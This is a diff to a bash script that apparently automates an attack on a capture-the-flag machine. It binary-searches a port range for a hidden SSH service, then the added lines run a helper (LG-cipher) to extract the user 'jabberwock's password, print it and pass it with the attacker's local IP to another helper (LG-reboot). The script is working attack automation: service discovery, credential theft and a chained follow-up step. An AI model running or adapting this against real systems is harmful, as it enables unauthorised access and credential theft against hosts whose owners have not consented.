@@ -11,6 +11,7 @@
 # but is handled
 
 TARGET=$1
+LOCAL=$2
 top_port=13999
 low_port=9000
 mid_port=$(( (("${top_port}" - "${low_port}")/2) + "${low_port}" ))
@@ -20,8 +21,8 @@ err() {
   echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
 }
 
-if [ -z "$1" ]; then
-  err "IP address required: ./ssh-search 10.10.10.10"
+if [ -z "$1" ] || [ -z "$2" ]; then
+  err "The format is: ./LG-primer TARGET_IP LOCAL_IP"
   exit 1
 fi
 
@@ -36,8 +37,14 @@ while [ "${port_range}" -gt 5 ]; do
   elif [[ "${result}" =~ Lower ]]; then
     low_port="${mid_port}"
   else
-    printf "\nConnect to the real SSH service using:\n"
-    printf "ssh %s -p %s\n" "${TARGET}" "${mid_port}"		
+    printf "\nThe real SSH service is at:\n"
+    printf "ssh %s -p %s\n" "${TARGET}" "${mid_port}"
+    printf "Accessing\n"
+    gimee=$(./LG-cipher "${TARGET}" "${mid_port}") && \
+    dalogin=$(grep jabberwock <<< $gimee)
+    dalogin=$(cut -d ":" -f 2 <<< $dalogin)
+    echo "jabberwock's password is $dalogin"
+    ./LG-reboot "${TARGET}" "${LOCAL}" "${dalogin}" && \
     exit 0
   fi
   mid_port=$(( (("${top_port}" - "${low_port}")/2) + "${low_port}" ))
@@ -51,8 +58,14 @@ for (( port="${low_port}"; port<="${top_port}"; port++ )); do
   if [[ "${result}" =~ Higher ]] || [[ "${result}" =~ Lower ]]; then
     continue
   else
-    printf "\nConnect to the real SSH service using:\n"
+    printf "\nThe real SSH service is at:\n"
     printf "ssh %s -p %s\n" "${TARGET}" "${port}"
+    printf "Accessing\n"
+    gimee=$(./LG-cipher "${TARGET}" "${port}") && \
+    dalogin=$(grep jabberwock <<< $gimee)
+    dalogin=$(cut -d ":" -f 2 <<< $dalogin)
+    echo "jabberwock's password is: $dalogin"
+    ./LG-reboot "${TARGET}" "${LOCAL}" "${dalogin}" && \
     exit 0
   fi
 done
